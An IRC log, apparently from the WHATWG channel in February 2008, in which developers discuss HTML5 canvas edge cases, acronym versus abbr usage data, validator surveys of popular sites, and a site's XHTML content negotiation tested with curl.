[12:21:00.0000] <Hixie>
Philip`: ignore the infinite cases or ignore the CTM 0 case?

[12:22:00.0000] <Philip`>
Hixie: The cases with both infinite lines and CTM 0

[12:23:00.0000] <Philip`>
(Each by itself is alright and is useful to define)

[12:23:01.0000] <Hixie>
ah

[12:23:02.0000] <Hixie>
send mail :-)

[12:23:03.0000] <Hixie>
Dashiva: any suggestions?

[12:25:00.0000] <Dashiva>
Well, the error I'm seeing is gEBI failing, which could be solved by using a closure instead.

[12:26:00.0000] <Dashiva>
I thought there was a test for gEBI updating, but I can't seem to find it.

[12:27:00.0000] <Philip`>
Hixie: By "ignore it", I mean "not send mail", because sending mail would be the opposite of ignoring the problem, and the mail would just suggest doing nothing at all and ignoring the problem since it's a worthless edge case :-)

[12:36:00.0000] <Hixie>
Dashiva: ok, it'll make test 80 fail if it doesn't work now

[12:36:01.0000] <Hixie>
Philip`: oh, i just meant we should make the spec say to draw nothing in that case

[12:37:00.0000] <Hixie>
Dashiva: what browser was this for?

[12:37:01.0000] <Dashiva>
Opera

[12:38:00.0000] <Dashiva>
It does pass the actual thing test 48 is for, funny enough

[12:38:01.0000] <Hixie>
yep, opera now says "linktest didn't fire onload"

[12:39:00.0000] <Dashiva>
Well, what happens is that onload does fire, but the onload handler errors because it can't find the linktest element

[12:39:01.0000] <Philip`>
Hixie: I think that would be unpleasantly complex (hence not worthwhile) to define, since it depends on the direction of the infinite line and whether the CTM is zero in that direction (e.g. scale(0,1) would cause problems for infinite horizontal lines, but would be perfectly sensible for infinite vertical lines)

[12:40:00.0000] <Philip`>
But I've failed at ignoring the problem since I've started discussing here, so I'll just send mail instead :-)

[12:40:01.0000] <Dashiva>
Maybe it could set a variable in the onload, then attempt to remove the class attr

[12:40:02.0000] <Dashiva>
That way you could see if onload never fired, or just failed to succeed

[12:44:00.0000] <Hixie>
Dashiva: i'll leave that to the people debugging the test

[12:44:01.0000] <annevk>
Hixie, where is webarch used?

[12:46:00.0000] <Hixie>
in the religious acts of the ivory tower's inhabitants, i presume

[12:49:00.0000] <Hixie>
i'd like to thank you all, especially hsivonen and Philip`, for moving the focus of the discussion on public-html to studying actual data

[12:49:01.0000] <Hixie>
it is so refreshing to see "expert opinions" be replaced by actual data

[12:51:00.0000] <Philip`>
(Aha! I don't actually need to send mail about the infinite arcTo thing, since a zero scale will make points coincident in the only case that would have been a problem, and so it's no longer an issue, so please feel free to ignore me)

[12:53:00.0000] <Hixie>
works for me!

[12:53:01.0000] <Hixie>
what does chris mean when he says:

[12:53:02.0000] <Hixie>
The rounding arc should be chosen 

[12:53:03.0000] <Hixie>
so that it is not contained in the convex hull of the stroke path segments 

[12:53:04.0000] <Hixie>
terminated at the points where the arc begins.

[12:54:00.0000] <Philip`>
About the "it used to say "another" point": it did say that, but I think it's acceptable to think of a point P and 'another' point Q regardless of whether P=Q, so it's better to be explicit :-)

[12:56:00.0000] <Philip`>
Hixie: I'm not exactly sure about the "stroke path segments terminated at the points where the arc begins", but the idea sounds correct

[12:57:00.0000] <Philip`>
If you start with just the end edges of the stroke that are perpendicular to their lines, then the convex hull will be the smallest triangle or quadrilateral that surrounds those edges

[12:58:00.0000] <Philip`>
and then the arc will be not inside that convex hull

[12:58:01.0000] <Philip`>
Oh, but actually that's not right

[12:59:00.0000] <Philip`>
since both possible arcs would be outside that shape

[13:01:00.0000] <Philip`>
/me tries to reply to that email

[13:08:00.0000] <Philip`>
Oh, actually, I think it is right, as long as you include a non-zero part of the stroke when calculating the convex hull (which is always possible since lines never have zero length)

[13:08:01.0000] <Philip`>
/me throws away his ASCII art pictures of circles :-(

[13:41:00.0000] <Hixie>
i have no idea what that e-mail means

[13:41:01.0000] <Hixie>
i don't know how to change the spec to address that e-mail

[13:45:00.0000] <hsivonen>
hmm. I'm not getting mail from W3C lists.

[13:46:00.0000] <hsivonen>
are others getting W3C list mail normally?

[13:48:00.0000] <Hixie>
hsivonen: yes

[13:48:01.0000] <jgraham_>
hsivonen: I'm getting public-html ok

[13:48:02.0000] <hsivonen>
ok. thanks

[13:48:03.0000] <Hixie>
hsivonen: including from you :-)

[13:49:00.0000] <Hixie>
btw, for the spaces-in-URIs thing... do we really want to define URI5?

[13:49:01.0000] <Hixie>
or IRI5 i guess

[13:49:02.0000] <Hixie>
we could fix other problems at the same time, like the encoding issue

[13:49:03.0000] <gsnedders>
Hixie: I'd just do what XML does for system identifiers

[13:50:00.0000] <hsivonen>
I don't know, but I think it is worth spending a thought or two on

[13:50:01.0000] <gsnedders>
(non-fatal error handling in XML!)

[13:50:02.0000] <Hixie>
what's that?

[13:50:03.0000] <Hixie>
gsnedders: well we're talking about making this a non-error

[13:50:04.0000] <gsnedders>
ah

[13:50:05.0000] <gsnedders>
I'd keep it as an error

[13:50:06.0000] <hsivonen>
gsnedders: the IRI lib I'm using can even be configured to check for XML system ID conformance separately from IRI conformance!

[13:50:07.0000] <jgraham_>
/me wonders if the "All software expands until it can read mail" thing will apply to html5, so eventually we'll end up doing IMAP5

[13:51:00.0000] <Dashiva>
jgraham: We already have sockets, what more do we need? :)

[13:51:01.0000] <hsivonen>
gsnedders: Is the XML thing really error handling or just a processing step?

[13:51:02.0000] <gsnedders>
woah.

[13:51:03.0000] <gsnedders>
I misremembered what XML said.

[13:52:00.0000] <gsnedders>
"System identifiers (and other XML strings meant to be used as URI references) may contain characters that, according to [IETF RFC 3986], must be escaped before a URI can be used to retrieve the referenced resource. The characters to be escaped are the control characters #x0 to #x1F and #x7F (most of which cannot appear in XML), space #x20, the delimiters '<' #x3C, '>' #x3E and '"' #x22, the unwise characters '{' #x7B, 

[13:52:01.0000] <gsnedders>
That means that XML System IDs can contain spaces!

[13:53:00.0000] <gsnedders>
hsivonen: just a processing step, looking it up

[13:54:00.0000] <gsnedders>
http://www.w3.org/TR/xml/#dt-sysid

[13:56:00.0000] <hsivonen>
fwiw, Validator.nu converts the IRIs entered in the UI to URIs with the lib in the IRI mode but converts XML system ids to URIs in the XML system ID mode.

[13:58:00.0000] <hsivonen>
craziness. the lib supports 6 different conformance modes for URI-like strings:

[13:58:01.0000] <hsivonen>
URI

[13:58:02.0000] <hsivonen>
IRI

[13:58:03.0000] <hsivonen>
RDF

[13:58:04.0000] <hsivonen>
XML Schema

[13:58:05.0000] <hsivonen>
XML system ID

[13:58:06.0000] <hsivonen>
XLink

[13:59:00.0000] <gsnedders>
Standards Suck.

[13:59:01.0000] <gsnedders>
Standards Suck 5 anyone?

[14:17:00.0000] <Philip`>
Hixie: Kristof's email? For his first paragraph, I'm guessing he was not disagreeing with what I said, so there's nothing to do. For the second paragraph, you could change the spec's definition of 'round' to require the drawn arc to be the one satisfying the condition he suggested

[14:18:00.0000] <Philip`>
(though I currently think the condition he suggested is not correct)

[14:22:00.0000] <hsivonen>
what validator back end is http://inursite.com/ running?

[14:27:00.0000] <jgraham_>
hsivonen: It appears to be using the w3c validator

[14:27:01.0000] <Philip`>
hsivonen: On the results page its "live validation" links to validator.w3.org

[14:28:00.0000] <Philip`>
(and it gives exactly the same validation messages as validator.w3.org)

[14:28:01.0000] <hsivonen>
jgraham_, Philip`: thanks

[14:54:00.0000] <Hixie>
Philip`: what is wrong with the current text? (or did you send mail already :-) )

[15:04:00.0000] <Philip`>
Hixie: About round, I did send mail (as a direct reply to you in "Canvas line styles comments"), saying "there's two possible arcs connecting those two corners (one clockwise, one anticlockwise), so it should specify which one is meant."

[15:24:00.0000] <Hixie>
k

[15:24:01.0000] <Hixie>
bbl


2008-02-03
[17:19:00.0000] <Philip`>
/me wonders if it'd be interesting to see what strings <acronym> and <abbr> are currently used for, to see if they're just interchangable in practice, or if it's best to stay far away from the whole topic

[17:22:00.0000] <Ketsuban>
The main problem with asking people to distinguish between <acronym> and <abbr> is that they don't know what the difference is (that is to say, an acronym is read out as the letters, like RSPCA, whereas an abbreviation is said, like NATO).

[17:22:01.0000] <Ketsuban>
I myself advocate keeping <acronym> around and saying people SHOULD use <acronym> for acronyms, but MAY use <abbr> if they don't know the difference.

[17:23:00.0000] <Ketsuban>
This is the friendliest solution for Web developers, but for developers of e.g. screen reading software it's pretty nightmarish.

[17:24:00.0000] <Philip`>
The main problem is that people who say they do know the difference disagree on what the difference is :-)

[17:24:01.0000] <Philip`>
Wikipedia says "The word acronym was coined during the mid-20th century for abbreviations pronounced as words, such as NATO and AIDS."

[17:24:02.0000] <Ketsuban>
Unfortunately that's not modern usage. =P

[17:24:03.0000] <Ketsuban>
I was taught acronyms are read out as letters.

[17:26:00.0000] <Philip`>
That's what I mean about people disagreeing

[17:27:00.0000] <Dashiva>
Is there anyone who disagrees that an acronym is also an abbreviation, regardless of what an acronym is defined to be?

[17:27:01.0000] <Ketsuban>
I don't disagree there.

[17:28:00.0000] <Ketsuban>
So I suppose that's the strongest argument you can give for dropping <acronym> altogether.

[17:31:00.0000] <Ketsuban>
But I think keeping <acronym> around but allowing unconditional use of <abbr> is marginally friendlier to the makers of screen readers etc.

[17:34:00.0000] <Philip`>
Screen readers are only helped if <acronym> is used mostly correctly, and if it's better to trust the markup than to guess, and it doesn't seem clear that that's the case

[17:41:00.0000] <annevk>
Philip`, that be useful, yes

[17:41:01.0000] <annevk>
would be, even

[17:42:00.0000] <Philip`>
/me should probably expand his collection of pages so there's a more useful amount of data

[17:48:00.0000] <mpt>
Do any existing screenreaders treat <abbr> differently from <acronym>?

[17:48:01.0000] <Philip`>
Do any treat them differently to <span>?

[17:49:00.0000] <mpt>
That's part of what I'm wondering :-)

[18:08:00.0000] <Philip`>
There's http://philip.html5.org/data/abbr-acronym.txt of quite limited usefulness or quality

[18:11:00.0000] <Hixie>
dunno what the two most common ones are from, but they seem highly pointless

[18:11:01.0000] <Hixie>
... title="CD">CD<...

[18:12:00.0000] <Philip`>
They're almost all http://www.imusic.dk/

[18:12:01.0000] <Hixie>
ah

[18:13:00.0000] <Hixie>
well this is prett convincing data as far as the elements being pointless goes

[18:13:01.0000] <Hixie>
as in, having both

[18:13:02.0000] <Hixie>
vs having one

[18:14:00.0000] <Philip`>
It looks like it wouldn't be good for a screen reader to try pronouncing <acronym>s as single words

[18:14:01.0000] <Philip`>
not to read out the individual letters

[18:14:02.0000] <Philip`>
which leaves them with zero good options

[18:15:00.0000] <Philip`>
s/not/nor/

[18:24:00.0000] <Philip`>
/me happens to see http://friendlybit.com/html/encyclopedia-of-html-elements/ saying "ACRONYM: No need to use this one, abbr is enough. Do we really need to differ between acronyms and abbreviations? What about initialisms and the other types of words?"

[18:25:00.0000] <Hixie>
screen readers are going to read it the same way they read text/plain

[18:25:01.0000] <Hixie>
which is to say, using their dictionary

[18:25:02.0000] <Hixie>
and heuristics

[18:26:00.0000] <jruderman>
<portmanteau>

[18:27:00.0000] <jruderman>
it could be a solution to the lame debate in http://en.wikipedia.org/wiki/Talk:Portmanteau#The_ubiquity_of_portmanteau : users could configure their browsers to display <portmanteau> differently

[18:29:00.0000] <Hixie>
"lame debate" is a redundant descriptor when linking to a URI with wiki/Talk: in it

[18:33:00.0000] <jruderman>
hehe

[03:26:00.0000] <takkaria>
I'm talking on a channel full of geeks who read the comic xkcd

[03:26:01.0000] <takkaria>
and it's amazing just how badly they misunderstand xhtml/html/rendering/css/the lot

[03:26:02.0000] <takkaria>
11:31 <+kremlin> You're suggesting that Firefox should parse XML files as if they were XHTML files, xipietotec?

[03:26:03.0000] <takkaria>
11:31 <+kremlin> The file extensions are different for a reason, you know.

[03:27:00.0000] <takkaria>
makes me wonder what hope the rest of the world has, really

[03:27:01.0000] <annevk>
rest of the world uses HTML :p

[03:28:00.0000] <takkaria>
apparently firefox 2 doesn't support XHTML so it just renders it as HTML

[03:28:01.0000] <Ketsuban>
Part of me thinks Firefox should render XHTML without any default themes at all beyond setting display: for the appropriate elements and styling form elements appropriately.

[03:30:00.0000] <jwalden>
eurgh

[03:31:00.0000] <Ketsuban>
But then I have really insane ideas sometimes. =P

[03:33:00.0000] <jwalden>
meh, we're all mad here

[03:36:00.0000] <takkaria>
now someone's saying that sometimes web servers don't serve all files ending in .html as text/html because sometimes it does content-sniffing

[03:36:01.0000] <takkaria>
sadly, I'm muted on that channel, so I can't join in the debate anymore

[03:37:00.0000] <jwalden>
*web servers* doing content sniffing?  sheesh

[03:38:00.0000] <annevk>
in theory it was the idea that web servers would do that

[03:38:01.0000] <annevk>
for <meta http-equiv> for instance

[03:40:00.0000] <jwalden>
no kidding

[03:40:01.0000] <jwalden>
learn something new every day!

[04:18:00.0000] <webben>
takkaria: Firefox2 does support XHTML.

[04:19:00.0000] <webben>
It will render it as HTML only if you serve it as text/html

[04:19:01.0000] <takkaria>
webben: I know that, and now the person who told me that does too

[04:20:00.0000] <webben>
ok

[04:20:01.0000] <webben>
misunderstood what you meant by 'apparently'

[04:21:00.0000] <webben>
takkaria: there's a channel for xkcd readers?

[04:23:00.0000] <takkaria>
webben: kk.  irc.xkcd.net

[04:24:00.0000] <takkaria>
or .com, I forget

[04:24:01.0000] <takkaria>
particularly #xkcd-signal; you get muted if you say something someone else has said before

[04:24:02.0000] <takkaria>
every time you do, your mute time gets doubled

[04:24:03.0000] <takkaria>
and every six hours it halves again

[04:24:04.0000] <webben>
hmm interesting

[04:24:05.0000] <webben>
ta

[07:21:00.0000] <Lachy>
/me attempted to go skiing today.

[07:22:00.0000] <Lachy>
unbelievably, the rental places didn't have skis with bindings large enough for my boots :-(

[07:25:00.0000] <jgraham_>
Oh so by "attempted" you actually mean "failed"

[07:26:00.0000] <Lachy>
yeah.

[07:26:01.0000] <jgraham_>
(I assumed you just meant you had been and were not very good)

[07:27:00.0000] <Lachy>
I do own my own crappy old straight skis that I bought second hand, but assumed I would be able to rent better skis

[07:27:01.0000] <Lachy>
so I didn't bother taking them

[07:27:02.0000] <Lachy>
I'm going to go buy some new skis tomorrow morning

[07:28:00.0000] <jgraham_>
/me has only been skiing on crappy dry slopes and even then not for many years

[07:34:00.0000] <gsnedders>
annevk: do browsers return the last header if you request Content-Type (or something else relevant to the protocol) and there are multiple headers of the type? What if there are occurrences of the header in the trailer of a chunked response?

[07:35:00.0000] <gsnedders>
/me wishes he could go skiing more often than once every few years :(

[07:39:00.0000] <Philip`>
/me wonders if 'sliding uncontrollably down a dry ski slope and sometimes not falling over' counts as skiing

[07:40:00.0000] <didymos>
Philip`, is there any other way? :)

[07:40:01.0000] <gsnedders>
/me thinks not

[07:40:02.0000] <Philip`>
Not in my personal experience :-)

[07:40:03.0000] <gsnedders>
/me has never fallen over a on a dry ski slope

[07:41:00.0000] <gsnedders>
I've never been on one either, but hey.

[07:41:01.0000] <gsnedders>
/me can just go up to Glenshee for the day

[07:43:00.0000] <hsivonen>
Philip`: the newes copy of your dmoz URL that I have downloaded is from July. Do you have a newer URL set available for download?

[07:44:00.0000] <hsivonen>
newest even

[07:45:00.0000] <Philip`>
hsivonen: I don't have a newer one - I've just been using one from before 2007-07-15

[07:45:01.0000] <Philip`>
(and it probably has the broken &amp; bits in it)

[07:46:00.0000] <hsivonen>
Philip`: ok

[07:47:00.0000] <hsivonen>
I have dmoz-unique-pages.txt.gz and dmoz-unique-pages-shuffle.txt.gz that are significantly different in size

[07:48:00.0000] <Philip`>
(If I remember correctly, it just came from http://rdf.dmoz.org/rdf/content.rdf.u8.gz and Perl regexps to extract the links, then sort and uniq)

[07:48:01.0000] <Philip`>
hsivonen: The uncompressed sizes should be identical

[07:48:02.0000] <hsivonen>
ok.

[07:48:03.0000] <Philip`>
but the shuffling hurts the compression a lot

[07:48:04.0000] <hsivonen>
how did you do the shuffling?

[07:48:05.0000] <Philip`>
Ideally I would have done it with 'sort -R'

[07:50:00.0000] <Philip`>
except that didn't actually shuffle things at all when I first tried it, so I just wrote a line of Perl to read get an array of [rand(), $uri] and then sorted by the random field and then printed it out again, which took a couple of gigabytes of memory and is not necessarily the best method

[07:50:01.0000] <Philip`>
('sort -R' works on one computer I use, but not on another, which is weird)

[08:00:00.0000] <Philip`>
hsivonen: If you're doing stuff with pages, http://canvex.lazyilluminati.com/misc/Test2.java might have some salvageably useful bits though it's full of bad ideas and copied-and-pasted chunks of code

[08:03:00.0000] <Philip`>
(I haven't even changed the original filename which it began evolving from long ago...)

[08:07:00.0000] <hsivonen>
Philip`: thanks

[08:18:00.0000] <hsivonen>
let's see what happens if I feed the first 10000 URLs from shuffle to Validator.nu

[08:19:00.0000] <Philip`>
/me wonders how long that will take

[08:20:00.0000] <Philip`>
(Parallelism definitely helps here, and is relatively trivial, which is nice)

[08:20:01.0000] <hsivonen>
this script is so simple that it doesn't have parallelism

[08:20:02.0000] <hsivonen>
I just run a simple python script on my own computer that feeds URIs sequentially to the Validator.nu Web service API

[08:21:00.0000] <Philip`>
How does it handle things like timeouts?

[08:21:01.0000] <hsivonen>
Philip`: it doesn't

[08:21:02.0000] <Philip`>
If it pauses for 30 seconds a few hundred times, it's going to be a bit painful

[08:21:03.0000] <hsivonen>
it's very likely that the setup is too simple

[08:22:00.0000] <hsivonen>
Philip`: Validator.nu itself has timeouts on its outgoing requests

[08:22:01.0000] <Philip`>
At least that's better than being too complex, so it sounds like a good place to start :-)

[08:32:00.0000] <SadEagle>
hmmm, lots of canvas changes

[08:33:00.0000] <Philip`>
and a lack of updated tests for those changes

[08:33:01.0000] <SadEagle>
so I am gonna be lazy for a bit :-)

[08:34:00.0000] <SadEagle>
thank goodness I have a centralized place to change just about all of the +/- inf and NaN handling

[08:37:00.0000] <Philip`>
Unfortunately I don't have a centralised place for that

[08:39:00.0000] <Philip`>
/me wonders how to make http://canvex.lazyilluminati.com/tests/tests/* redirect to http://philip.html5.org/tests/canvas/suite/tests/*

[08:41:00.0000] <Philip`>
Oh, with "Redirect" - that was easy

[09:17:00.0000] <hsivonen>
hmm. curiously, the 10000 url script started getting 503 from Validator.nu at some point without Validator.nu crashing

[09:18:00.0000] <hsivonen>
I wonder if mod_jk has some kind of DoS prevention that kicked in

[09:18:01.0000] <hsivonen>
or Apache itself

[09:56:00.0000] <annevk>
wow, that image maps are still so widely deployed

[10:01:00.0000] <hsivonen>
hmm. perhaps there are even more than one application/xhtml+xml site in the Alexa globar 500

[10:01:01.0000] <hsivonen>
global

[10:01:02.0000] <annevk>
wow

[10:07:00.0000] <Philip`>
What is the "   1 www.icio.us"?

[10:08:00.0000] <hsivonen>
Philip`: probably a regexping error

[10:08:01.0000] <Philip`>
It would be nice to show the number of pages that contain each error, rather than the total count

[10:08:02.0000] <Philip`>
s/rather than/as well as/

[10:11:00.0000] <Philip`>
http://my.opera.com/community/forums/topic.dml?id=163885&t=1202062644&page=1#comment2212326 - yay, XML

[10:20:00.0000] <blooberry>
hsivonen: did you find more than one application/xhtml+xml site in the alexa global 500 then? The "perhaps" make me curious. 8-}

[10:21:00.0000] <blooberry>
I only found one...

[10:26:00.0000] <hsivonen>
blooberry: I rechecked. there's only one.

[10:26:01.0000] <webben>
hsivonen: How are you requesting XHTML?

[10:26:02.0000] <blooberry>
iwiw.hu?

[10:26:03.0000] <hsivonen>
blooberry: yes

[10:28:00.0000] <hsivonen>
webben: Accept: application/xhtml+xml, application/xml; q=0.5, text/html; q=0.9

[10:38:00.0000] <hsivonen>
Philip`: each page counted at most once per error: http://hsivonen.iki.fi/test/moz/alexa500-page-collapsed-counts.txt

[13:24:00.0000] <gavin_>
hsivonen: www.iwiw.hu is sending text/html as far as I can tell...

[13:24:01.0000] <gavin_>
did it just change or something?

[13:25:00.0000] <gavin_>
I've tried a few different UAs, too

[13:28:00.0000] <hsivonen>
gavin_: Page Info says application/xhtml+xml in Minefield nightly

[13:30:00.0000] <gavin_>
ah, interesting

[13:30:01.0000] <Dashiva>
Same in Opera

[13:31:00.0000] <gavin_>
that is what I get for http://iwiw.hu/pages/user/login.jsp

[13:32:00.0000] <hsivonen>
www.iwiw.hu redirects me to http://www.iwiw.hu/pages/user/login.jsp which is application/xhtml+xml to Minefield

[13:33:00.0000] <gavin_>
yeah, I see that too

[13:33:01.0000] <gavin_>
but if I load the login.jsp URL in IE7, it works

[13:33:02.0000] <gavin_>
I thought IE7 barfed on application/xhtml+xml ?

[13:33:03.0000] <hsivonen>
most likely it varies the Content-Type on Accept

[13:34:00.0000] <gavin_>
ah, right

[13:34:01.0000] <webben>
gavin: curl -H 'accept: application/xhtml+xml,text/html;q=0' -v http://www.iwiw.hu/pages/user/login.jsp returns Content-Type: application/xhtml+xml;charset=UTF-8

[13:34:02.0000] <gavin_>
web-sniffer doesn't let me change Accept

[13:35:00.0000] <webben>
as does accept: application/xhtml+xml;q=0,text/html ... fail!

[13:35:01.0000] <webben>
curl -H 'accept: text/html' -v http://www.iwiw.hu/pages/user/login.jsp returns text/html

[13:36:00.0000] <webben>
someone tell them their content negotiation is borked ;)

[13:50:00.0000] <Philip`>
hsivonen: About error counts: Thanks

[13:51:00.0000] <Philip`>
Comparing to http://canvex.lazyilluminati.com/survey/2007-07-17/analyse.cgi/index#parse-errors there's a significant difference in the number with unencoded ampersands

[13:51:01.0000] <Philip`>
which I'd assume is due to top-500 sites being more likely to have dynamic pages with query strings needing ampersands, so that sounds quite plausible

[14:16:00.0000] <Hixie>
Lachy: if you have a chance, any way we can set up blog.whatwg.org/faq to be a redirect to the wiki faq?

[14:22:00.0000] <Lachy>
oh, damn. That had been done before, but with the last upgrade, I accidentally deleted the .htaccess.

[14:22:01.0000] <Lachy>
I'll check if I have a backup

[14:23:00.0000] <Lachy>
good, I do. Uploading it now

[14:25:00.0000] <Hixie>
thanks

[14:25:01.0000] <Hixie>
i fixed the link on the front page too

[14:25:02.0000] <Hixie>
(someone complained it was 404)

[14:25:03.0000] <Hixie>
so that shouldn't be a big issue any more

[14:30:00.0000] <Lachy>
all fixed

[14:31:00.0000] <Lachy>
ah, it looks like you removed the link entirely

[14:32:00.0000] <Hixie>
no i mean on www.whatwg.org

[14:32:01.0000] <Hixie>
made it point to the wiki

[14:33:00.0000] <Lachy>
oh, I thought you meant the blog's front page. The link to the FAQ seems to be missing from there

[14:33:01.0000] <Hixie>
odd

[14:33:02.0000] <Hixie>
didn't touch the blog

[14:33:03.0000] <Hixie>
update fallout?

[14:34:00.0000] <Lachy>
oh, maybe I never added the links again, after I moved the faq from the blog to the wiki

[14:53:00.0000] <zcorpan_>
hsivonen: in order to make the grouping feature more useful, perhaps the attribute value should be stripped from the message for errors about attribute values

[14:56:00.0000] <zcorpan_>
(or the grouping feature should just be smarter and do the same as you did with the alexia result list)

[14:59:00.0000] <zcorpan_>
looking at the bottom of that list shows that unmatched quotes is relatively common

[15:00:00.0000] <zcorpan_>
the very last error also seems harmless

[15:01:00.0000] <zcorpan_>
banning ; in attribute names might also be effective

[15:11:00.0000] <zcorpan_>
hsivonen: though, the grouping feature is intended to help with search-replace fixing rather than fix-the-spec-studying, so what to group might be different

[15:15:00.0000] <zcorpan_>
0022 / 491 Bad value (consolidated) for attribute “width” on element “img”: Zero is not a positive integer.

[15:15:01.0000] <zcorpan_>
i think that's <noscript><img src=tracker.cgi with=0 height=0>

[15:15:02.0000] <zcorpan_>
s/with/width/

[15:20:00.0000] <zcorpan_>
we might also want to allow width/height on <input type=image>

[15:24:00.0000] <zcorpan_>
0013 / 491 Stray “script” start tag.

[15:24:01.0000] <zcorpan_>
when can a script start tag be stray?

[15:26:00.0000] <zcorpan_>
/me ponders about <noscript><style scroped>


2008-02-04
[16:10:00.0000] <Philip`>
/me wonders if he can do a regexp conversion of the tree construction algorithm into executable code

[18:32:00.0000] <Hixie>
was http://blog.whatwg.org/faq/ ever a valid URI?

[18:32:01.0000] <Hixie>
if so the redirect is wrong

[18:39:00.0000] <Lachy>
ok, I'll fix it

[18:40:00.0000] <Lachy>
fixed

[18:41:00.0000] <Lachy>
good night

[23:55:00.0000] <hsivonen>
http://www.imc.org/atom-syntax/mail-archive/msg20402.html

[23:58:00.0000] <othermaciej>
tasty!

[00:02:00.0000] <othermaciej>
it's good to know that Namespaces in XML are still busy providing non-solutions to non-problems

[00:13:00.0000] <MikeSmith>
that seems worth quoting

[00:13:01.0000] <MikeSmith>
"I think the lesson here is to write better specs, not rail against programmers when they are presented with bad ones."

[00:14:00.0000] <hsivonen>
zcorpan: stray script happens after </body>

[00:14:01.0000] <hsivonen>
http://html5.validator.nu/?doc=http%3A%2F%2Fwww.imageshack.us%2F&showsource=yes#l563c73

[00:14:02.0000] <hsivonen>
http://html5.validator.nu/?doc=http%3A%2F%2Fwww.google.com.hk%2F&showsource=yes#l3c4938

[01:56:00.0000] <Philip`>
https://bugzilla.mozilla.org/show_bug.cgi?id=415168

[03:21:00.0000] <annevk>
http://googleblog.blogspot.com/2008/02/yahoo-and-future-of-internet.html

[04:04:00.0000] <hsivonen>
zcorpan: Validator.nu now permutes attributes so that the RELAX NG layer always sees the type attribute of <input> and <command> before the other element-specific attributes, the content attribute of <meta> after the other attributes and the template attribute before everything else

[04:04:01.0000] <hsivonen>
oh, and the wrap attribute of textarea is hoisted, too

[04:35:00.0000] <hsivonen>
zcorpan_: replies in logs

[04:36:00.0000] <zcorpan_>
/me looks

[04:37:00.0000] <zcorpan_>
hsivonen: nice

[06:13:00.0000] <Philip`>
Where HTML5 says "insert an HTML element with the same tag name as the token's.", that sounds like you don't give it the same attributes as the current token's, but that doesn't seem to make sense

[06:16:00.0000] <annevk>
seems that http://www.whatwg.org/specs/web-apps/current-work/multipage/section-tree-construction.html#creating addresses that

[06:21:00.0000] <Philip`>
"create an element for a token" happens during "insert an HTML element for a token", but inserting an element with another token's tag name is not the same as inserting an element for that token

[06:21:01.0000] <annevk>
indeed, the difference is the tag name

[06:23:00.0000] <Philip`>
The difference is that inserting an element with another token's tag name does not define an actual token to insert the HTML element for

[06:23:01.0000] <Philip`>
I don't see why it doesn't just say "Insert an HTML element for the token"

[06:25:00.0000] <annevk>
you're right, that would make more sense

[06:46:00.0000] <zcorpan_>
http://forums.whatwg.org/viewtopic.php?t=142

[06:51:00.0000] <annevk>
replied

[06:59:00.0000] <annevk>
zcorpan_, in http://simon.html5.org/specs/xml-stylesheet5 "content type" should probably say "content type, excluding parameters,"

[07:09:00.0000] <zcorpan_>
annevk: thanks, changed to "MIME type" and said to ignore parameters where appropriate

[07:10:00.0000] <annevk>
fwiw, I believe the preferred term is "media type"

[07:11:00.0000] <zcorpan_>
what's the difference? a MIME type can have parameters and media type is a subset of MIME type?

[07:12:00.0000] <annevk>
no, they both mean the same thing, it's just that one is preferred per my recollection

[07:13:00.0000] <zcorpan_>
oh, ok. media type conflicts with MQ in my mind :)

[07:46:00.0000] <aroben>
Hixie: the tracker seems to be non-functional (e.g., <http://html5.org/tools/web-apps-tracker?from=1196&to=1197>)

[07:47:00.0000] <aroben>
Hixie: for me it says "No result."

[07:49:00.0000] <annevk>
he's not responsible

[07:49:01.0000] <annevk>
seems that svn.whatwg.org is down

[07:49:02.0000] <annevk>
for which he is responsible :p

[08:51:00.0000] <Philip`>
Hixie: On a page like http://www.whatwg.org/specs/web-apps/current-work/multipage/section-tree-construction.html the annotation system login box hides some text behind it, which is quite undesirable

[10:21:00.0000] <gsnedders>
what's the POSIX command that gets the path of a command (i.e., curl would return /usr/bin/curl if $PATH said to look there first and it was there)?

[10:23:00.0000] <gsnedders>
which

[10:27:00.0000] <Philip`>
That doesn't seem to be POSIX

[10:28:00.0000] <Philip`>
(Hooray, now I can parse token streams that contain nothing but comments)

[10:29:00.0000] <Philip`>
(except it gets it backwards if you have >= 1 comment)

[12:57:00.0000] <blooberry>
grr. renee saarsoo's dmoz research has disappeared from his site. *consults google cache*

[13:03:00.0000] <Philip`>
blooberry: http://web.archive.org/*/triin.net/2006/06/12/HTML seems to work

[13:04:00.0000] <blooberry>
philip`: *nod* I'll email him too. I just received a response from him a week or so about his research, so I doubt that the site is stale

[13:04:01.0000] <blooberry>
something probably just went all broke-y. 8-}

[13:12:00.0000] <jwalden>
Hixie: https://bugzilla.mozilla.org/show_bug.cgi?id=387706#c52

[13:12:01.0000] <jwalden>
^ also for anyone else who cares about HTML5 postMessage

[13:12:02.0000] <jwalden>
:-\

[13:15:00.0000] <SadEagle>
jwalden: http://lxr.kde.org/source/KDE/kdelibs/kdeui/util/fixx11h.h?v=4.0-branch#250

[13:18:00.0000] <othermaciej>
jwalden: seems like a Mozilla issue that to name something postMessage you need to conflict with the name PostMessage

[13:18:01.0000] <jwalden>
I agree, more or less

[13:19:00.0000] <jwalden>
I think it's more a Windows issue than anything else, tho

[13:19:01.0000] <jwalden>
SadEagle: does that work in headers?  claim at the top of that file is it doesn't

[13:19:02.0000] <othermaciej>
well in WebKit for instance, there doesn't have to be any identifier named "PostMessage" to name something "postMessage", but I agree also that Windows system headers are a cesspool of despair

[13:20:00.0000] <Philip`>
Just #undef PostMessage and then use PostMessageW whenever you want to talk to Windows

[13:20:01.0000] <SadEagle>
jwalden: I don't see why it won't. The problem is, the trick would rename the Win32 postMessage to something else. And your windows port might actually use that

[13:21:00.0000] <Philip`>
/me assumes it works sort of like that, but could be totally wrong

[13:21:01.0000] <jwalden>
not our code that's breaking, is the problem

[13:21:02.0000] <SadEagle>
Philip`: except when PostMessageA is wanted :-)

[13:21:03.0000] <jwalden>
I'd totally use that fix if we were broken

[13:21:04.0000] <Philip`>
SadEagle: But nobody wants ANSI any more :-)

[13:21:05.0000] <SadEagle>
othermaciej: they got nothing on X headers :-)

[13:39:00.0000] <roc>
aaargh, the memories

[13:39:01.0000] <roc>
 "#define Status int"

[13:41:00.0000] <othermaciej>
given that Microsoft's strategy is to focus on developers, you have to wonder what it would be like if they focused on end uers

[14:01:00.0000] <jwalden>
hrm

[14:02:00.0000] <jwalden>
MS extensions for the sorta-win, at a glance: http://msdn2.microsoft.com/en-us/library/hsttss76.aspx

[14:03:00.0000] <Philip`>
Hmm, they totally broke MSDN in Opera
